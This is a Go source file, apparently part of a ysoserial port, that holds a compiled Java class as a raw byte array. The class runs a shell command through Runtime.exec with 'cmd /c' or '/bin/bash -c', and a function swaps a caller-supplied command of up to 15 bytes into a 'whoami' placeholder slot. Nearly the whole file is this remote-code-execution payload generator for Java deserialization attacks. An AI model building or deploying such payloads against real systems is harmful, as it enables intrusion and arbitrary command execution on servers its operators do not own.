package ysoserial

import (
	"bytes"
	"errors"
	"fmt"
	"os"
)

func processBytes(input []byte) ([]byte, error) {
	const desiredLength = 15

	if len(input) > desiredLength {
		return nil, errors.New("input exceeds maximum allowed length of 15 bytes")
	}
	for len(input) < desiredLength {
		input = append(input, 0x00)
	}

	return input, errors.New("")
}

func TemplatesImpl(cmd string) []byte {
	TemplatesImplQ := []byte{0xca, 0xfe, 0xba, 0xbe, 0x00, 0x31, 0x00, 0x56, 0x01, 0x00, 0x2f, 0x6f, 0x72, 0x67, 0x2f, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2f, 0x78, 0x61, 0x6c, 0x61, 0x6e, 0x2f, 0x61, 0x70, 0x61, 0x63, 0x68, 0x65, 0x2f, 0x62, 0x63, 0x65, 0x6c, 0x2f, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x43, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x73, 0x07, 0x00, 0x01, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x07, 0x00, 0x03, 0x01, 0x00, 0x07, 0x65, 0x78, 0x65, 0x63, 0x43, 0x6d, 0x64, 0x01, 0x00, 0x33, 0x28, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x69, 0x6f, 0x2f, 0x42, 0x79, 0x74, 0x65, 0x41, 0x72, 0x61, 0x79, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6d, 0x3b, 0x01, 0x00, 0x04, 0x43, 0x6f, 0x64, 0x65, 0x01, 0x00, 0x13, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x07, 0x00, 0x08, 0x01, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x07, 0x00, 0x0a, 0x01, 0x00, 0x13, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x07, 0x00, 0x0c, 0x01, 0x00, 0x13, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x69, 0x6f, 0x2f, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6d, 0x07, 0x00, 0x0e, 0x01, 0x00, 0x1d, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x69, 0x6f, 0x2f, 0x42, 0x79, 0x74, 0x65, 0x41, 0x72, 0x61, 0x79, 0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6d, 0x07, 0x00, 0x10, 0x01, 0x00, 0x02, 0x5b, 0x42, 0x07, 0x00, 0x12, 0x01, 0x00, 0x0d, 0x53, 0x74, 0x61, 0x63, 0x6b, 0x4d, 0x61, 0x70, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x01, 0x00, 0x07, 0x69, 0x73, 0x45, 0x6d, 0x70, 0x74, 0x79, 0x01, 0x00, 0x03, 0x28, 0x29, 0x5a, 0x0c, 0x00, 0x15, 0x00, 0x16, 0x0a, 0x00, 0x0b, 0x00, 0x17, 0x01, 0x00, 0x07, 0x6f, 0x73, 0x2e, 0x6e, 0x61, 0x6d, 0x65, 0x08, 0x00, 0x19, 0x01, 0x00, 0x10, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x07, 0x00, 0x1b, 0x01, 0x00, 0x0b, 0x67, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x70, 0x65, 0x72, 0x74, 0x79, 0x01, 0x00, 0x26, 0x28, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x0c, 0x00, 0x1d, 0x00, 0x1e, 0x0a, 0x00, 0x1c, 0x00, 0x1f, 0x01, 0x00, 0x0b, 0x74, 0x6f, 0x4c, 0x6f, 0x77, 0x65, 0x72, 0x43, 0x61, 0x73, 0x65, 0x01, 0x00, 0x14, 0x28, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x0c, 0x00, 0x21, 0x00, 0x22, 0x0a, 0x00, 0x0b, 0x00, 0x23, 0x01, 0x00, 0x03, 0x77, 0x69, 0x6e, 0x08, 0x00, 0x25, 0x01, 0x00, 0x08, 0x63, 0x6f, 0x6e, 0x74, 0x61, 0x69, 0x6e, 0x73, 0x01, 0x00, 0x1b, 0x28, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x43, 0x68, 0x61, 0x72, 0x53, 0x65, 0x71, 0x75, 0x65, 0x6e, 0x63, 0x65, 0x3b, 0x29, 0x5a, 0x0c, 0x00, 0x27, 0x00, 0x28, 0x0a, 0x00, 0x0b, 0x00, 0x29, 0x01, 0x00, 0x03, 0x63, 0x6d, 0x64, 0x08, 0x00, 0x2b, 0x01, 0x00, 0x02, 0x2f, 0x63, 0x08, 0x00, 0x2d, 0x01, 0x00, 0x09, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x08, 0x00, 0x2f, 0x01, 0x00, 0x02, 0x2d, 0x63, 0x08, 0x00, 0x31, 0x01, 0x00, 0x11, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x07, 0x00, 0x33, 0x01, 0x00, 0x0a, 0x67, 0x65, 0x74, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x01, 0x00, 0x15, 0x28, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x52, 0x75, 0x6e, 0x74, 0x69, 0x6d, 0x65, 0x3b, 0x0c, 0x00, 0x35, 0x00, 0x36, 0x0a, 0x00, 0x34, 0x00, 0x37, 0x01, 0x00, 0x04, 0x65, 0x78, 0x65, 0x63, 0x01, 0x00, 0x28, 0x5b, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x3b, 0x0c, 0x00, 0x39, 0x00, 0x3a, 0x0a, 0x00, 0x34, 0x00, 0x3b, 0x01, 0x00, 0x11, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x07, 0x00, 0x3d, 0x01, 0x00, 0x0e, 0x67, 0x65, 0x74, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6d, 0x01, 0x00, 0x17, 0x28, 0x29, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x69, 0x6f, 0x2f, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6d, 0x3b, 0x0c, 0x00, 0x3f, 0x00, 0x40, 0x0a, 0x00, 0x3e, 0x00, 0x41, 0x01, 0x00, 0x06, 0x3c, 0x69, 0x6e, 0x69, 0x74, 0x3e, 0x01, 0x00, 0x03, 0x28, 0x29, 0x56, 0x0c, 0x00, 0x43, 0x00, 0x44, 0x0a, 0x00, 0x11, 0x00, 0x45, 0x01, 0x00, 0x05, 0x77, 0x72, 0x69, 0x74, 0x65, 0x01, 0x00, 0x07, 0x28, 0x5b, 0x42, 0x49, 0x29, 0x56, 0x0c, 0x00, 0x47, 0x00, 0x48, 0x0a, 0x00, 0x11, 0x00, 0x49, 0x01, 0x00, 0x04, 0x72, 0x65, 0x61, 0x64, 0x01, 0x00, 0x05, 0x28, 0x5b, 0x42, 0x29, 0x49, 0x0c, 0x00, 0x4b, 0x00, 0x4c, 0x0a, 0x00, 0x0f, 0x00, 0x4d, 0x0a, 0x00, 0x04, 0x00, 0x45, 0x01, 0x00, 0x0c, 0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x08, 0x00, 0x50, 0x0c, 0x00, 0x05, 0x00, 0x06, 0x0a, 0x00, 0x02, 0x00, 0x52, 0x01, 0x00, 0x0a, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x01, 0x00, 0x17, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6f, 0x6e, 0x43, 0x6f, 0x6e, 0x73, 0x74, 0x61, 0x6e, 0x74, 0x73, 0x2e, 0x6a, 0x61, 0x76, 0x61, 0x00, 0x21, 0x00, 0x02, 0x00, 0x04, 0x00, 0x02, 0x00, 0x09, 0x00, 0x05, 0x00, 0x06, 0x00, 0x01, 0x00, 0x07, 0x00, 0xe2, 0x00, 0x04, 0x00, 0x07, 0x00, 0x8c, 0x2a, 0x01, 0xa5, 0x00, 0x0a, 0x2a, 0xb6, 0x00, 0x18, 0x99, 0x00, 0x06, 0xa7, 0x00, 0x76, 0x01, 0x4c, 0x12, 0x1a, 0xb8, 0x00, 0x20, 0xb6, 0x00, 0x24, 0x12, 0x26, 0xb6, 0x00, 0x2a, 0x99, 0x00, 0x19, 0x06, 0xbd, 0x00, 0x0b, 0x59, 0x03, 0x12, 0x2c, 0x53, 0x59, 0x04, 0x12, 0x2e, 0x53, 0x59, 0x05, 0x2a, 0x53, 0x4c, 0xa7, 0x00, 0x16, 0x06, 0xbd, 0x00, 0x0b, 0x59, 0x03, 0x12, 0x30, 0x53, 0x59, 0x04, 0x12, 0x32, 0x53, 0x59, 0x05, 0x2a, 0x53, 0x4c, 0xb8, 0x00, 0x38, 0x2b, 0xb6, 0x00, 0x3c, 0xb6, 0x00, 0x42, 0x4d, 0xbb, 0x00, 0x11, 0x59, 0xb7, 0x00, 0x46, 0x4e, 0x03, 0x36, 0x04, 0x11, 0x04, 0x00, 0xbc, 0x08, 0x3a, 0x05, 0xa7, 0x00, 0x0c, 0x2d, 0x19, 0x05, 0x03, 0x15, 0x04, 0xb6, 0x00, 0x4a, 0x2c, 0x19, 0x05, 0xb6, 0x00, 0x4e, 0x59, 0x36, 0x04, 0x02, 0xa0, 0xff, 0xed, 0x2d, 0xb0, 0xa7, 0x00, 0x08, 0x3a, 0x06, 0xa7, 0x00, 0x03, 0x01, 0xb0, 0x00, 0x01, 0x00, 0x82, 0x00, 0x85, 0x00, 0x09, 0x00, 0x01, 0x00, 0x14, 0x00, 0x3c, 0x00, 0x09, 0x0c, 0x02, 0xfc, 0x00, 0x27, 0x05, 0xff, 0x00, 0x12, 0x00, 0x02, 0x07, 0x00, 0x0b, 0x07, 0x00, 0x0d, 0x00, 0xff, 0x00, 0x1f, 0x00, 0x06, 0x07, 0x00, 0x0b, 0x07, 0x00, 0x0d, 0x07, 0x00, 0x0f, 0x07, 0x00, 0x11, 0x01, 0x07, 0x00, 0x13, 0x00, 0x08, 0xff, 0x00, 0x0e, 0x00, 0x01, 0x07, 0x00, 0x0b, 0x00, 0x42, 0x07, 0x00, 0x09, 0x04, 0x00, 0x01, 0x00, 0x43, 0x00, 0x44, 0x00, 0x01, 0x00, 0x07, 0x00, 0x17, 0x00, 0x01, 0x00, 0x01, 0x00, 0x0b, 0x2a, 0xb7, 0x00, 0x4f, 0x12, 0x51, 0xb8, 0x00, 0x53, 0x57, 0xb1, 0x00, 0x01, 0x00, 0x54, 0x00, 0x02, 0x00, 0x55}
	processedInput, err := processBytes([]byte(cmd))
	fmt.Println(err.Error())
	if err.Error() != "" {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
	v := bytes.Replace(TemplatesImplQ, []byte{0x01, 0x00, 0x0c, 0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36}, processedInput, -1)
	return v
}
